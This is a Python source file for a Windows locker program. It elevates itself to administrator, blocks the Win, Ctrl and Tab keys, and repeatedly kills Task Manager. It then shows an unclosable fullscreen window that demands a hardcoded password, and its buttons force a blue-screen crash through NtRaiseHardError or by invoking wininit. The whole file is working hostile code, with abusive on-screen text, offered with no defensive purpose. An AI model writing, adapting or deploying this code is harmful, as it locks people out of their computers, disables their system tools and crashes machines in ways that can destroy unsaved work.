import threading
import subprocess
import sys
import ctypes
import time
import customtkinter as ctk
import keyboard
import pyautogui
import os
import pyuac

keyboard.block_key('Win')
keyboard.block_key('Ctrl')
keyboard.block_key('Tab')
pyautogui.FAILSAFE = False
running = True

def spam_close():
    global running
    while running:
        time.sleep(0.1)
        os.system("taskkill /F /IM taskmgr.exe")
        subprocess.run(["powershell", "-Command", "taskkill /F /IM taskmgr.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return


secret = "NeverGonnaGiveYouUp"
screen = [1920, 1080]
debug = False
if len(sys.argv) > 1:
    for item in sys.argv:
        if item == "--debug":
            debug = True


def is_admin():
    return pyuac.isUserAdmin()


def BSOD0():
    if not debug:
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            print("BSOD Successfull!")
        else:
            print("BSOD Failed...")
    else:
        print("BSOD1")


def BSOD1():
    if not debug:
        subprocess.run(["powershell", "-Command", "wininit"], capture_output=True)
    else:
        print("BSOD2")


class GoFuckUrSelf(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.trieslol = ctk.IntVar(value=0)
        self.button_text = ctk.StringVar(value=f'Tries: {self.trieslol.get()}')
        self.title("Good Luck Getting Out Of This Without A BSOD ._.")
        self.attributes("-fullscreen", True)
        self.configure(bg="#0a70a9", fg_color="#0a70a9", fg="#0a70a9")
        self.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.after(100, self.bring_to_front)
        self.passwordbox = ctk.CTkEntry(master=self, width=200, bg_color="#074f78", fg_color="#074f78", corner_radius=0, border_color="#0a70a9")
        self.passwordbox.place(x=screen[0]/2-316/2, y=screen[1]-30)
        self.passwordbutton = ctk.CTkButton(master=self, width=100, textvariable=self.button_text, command=self.verify_exit_code, fg_color="#074f78", corner_radius=5)
        self.passwordbutton.place(x=screen[0]/2+50, y=screen[1]-30)

        self.frame_frame = ctk.CTkFrame(master=self, bg_color="#0a70a9", fg_color="#0a70a9", width=720, height=450)
        self.frame_frame.place(x=int((screen[0]/1920) * 240), y=int((screen[1]/1080) * 170))
        self.frame_label1 = ctk.CTkLabel(master=self.frame_frame, text="( x_x)", font=("Seoge UI", 140))
        self.frame_label1.place(x=0, y=0)
        # x=316
        self.frame_label2 = ctk.CTkLabel(master=self.frame_frame, text="And now ur stuck", font=("Minecraft", 36))
        self.frame_label2.place(x=20, y=225)
        self.frame_label2 = ctk.CTkLabel(master=self.frame_frame, text="Good luck getting out of this window without getting a bsod", font=("Minecraftia", 16))
        self.frame_label2.place(x=30, y=295)
        self.frame_label2 = ctk.CTkLabel(master=self.frame_frame,
                                         text="Anyways, you can choose the reason your pc crashes, or guess the password",
                                         font=("Minecraftia", 12))
        self.frame_label2.place(x=40, y=350)
        self.frame_label2 = ctk.CTkLabel(master=self.frame_frame,
                                         text="Your task manager settings are probably shit, so dont even try it",
                                         font=("Minecraftia", 12))
        self.frame_label2.place(x=40, y=405)
        self.bsod1 = ctk.CTkButton(master=self.frame_frame, text='0xDEADDEAD', command=BSOD0)
        self.bsod1.place(x=50, y=380)
        self.bsod2 = ctk.CTkButton(master=self.frame_frame, text='CRITICAL_PROCESS_DIED', command=BSOD1)
        self.bsod2.place(x=200, y=380)



    def verify_exit_code(self):
        user_input = self.passwordbox.get()
        if user_input == secret:
            self.destroy()
        else:
            curr = self.trieslol.get()
            self.trieslol.set(curr + 1)
            self.button_text.set(f'Tries: {self.trieslol.get()}')
            threading.Thread(target=self.change_bg_color_fail).start()


    def change_bg_color_fail(self):
        self.configure(bg="#ff0000", fg_color="#ff0000", fg="#ff0000")
        self.passwordbox.configure(border_color="#ff0000")
        time.sleep(1)
        self.configure(bg="#0a70a9", fg_color="#0a70a9", fg="#0a70a9")
        self.passwordbox.configure(border_color="#0a70a9")
        return


    def disable_close(self):
        pass


    def bring_to_front(self):
        self.lift()
        self.attributes("-topmost", True)
        self.after(100, self.bring_to_front)


if __name__ == '__main__':
    if is_admin():
        threading.Thread(target=spam_close).start()
        app = GoFuckUrSelf()
        app.mainloop()
        keyboard.unblock_key('Win')
        keyboard.unblock_key('Tab')
        keyboard.unblock_key('Ctrl')
        running = False
    else:
        pyuac.runAsAdmin()


